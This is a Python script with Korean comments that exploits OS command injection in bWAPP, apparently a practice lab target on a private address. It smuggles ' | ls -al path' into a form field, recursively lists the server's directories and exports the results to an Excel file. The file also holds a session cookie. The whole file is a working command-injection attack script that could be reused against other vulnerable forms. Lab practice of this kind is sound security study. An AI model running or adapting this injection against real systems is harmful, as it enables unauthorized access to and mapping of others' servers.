import requests
import pandas as pd
from bs4 import BeautifulSoup

def fetch_directory_listing(url, headers, path):
    # 명령어를 전송하여 디렉터리 내용을 가져옵니다.
    data = {
        "target": f" | ls -al {path}",
        "form": "submit"
    }
    response = requests.post(url, headers=headers, data=data)
    soup = BeautifulSoup(response.text, 'html.parser')
    data_tag = soup.find('p', align="left")
    if data_tag:
        lines = data_tag.text.split('\n')
        data_list = []

        for line in lines[1:]:
            parts = line.split(maxsplit=8)
            if len(parts) == 9:
                data_list.append(parts)
                # 디렉터리인 경우 재귀적으로 호출
                if parts[0][0] == 'd' and parts[8] not in ('.', '..'):  # '.'와 '..'은 현재 디렉터리와 상위 디렉터리를 나타냄
                    new_path = path + '/' + parts[8] if path else parts[8]  # 최초 경로가 빈 문자열이 아니면 경로를 추가
                    data_list.extend(fetch_directory_listing(url, headers, new_path))

        return data_list
    return []

headers = {
    "Referrer": "http://192.168.157.129/bWAPP/commandi.php",
    "Cookie": "PHPSESSID=726eb70ad72d36c80265f5e5a0e9c0f4; security_level=0"
}

url = "http://192.168.157.129/bWAPP/commandi.php"
directory_data = fetch_directory_listing(url, headers, "")

df = pd.DataFrame(directory_data, columns=['Permissions', 'Lowerdir', 'Owner', 'Group', 'Size', 'Month', 'Day', 'Year', 'Name'])
df.to_excel('output_recursive1.xlsx', index=False)

print("Complete")
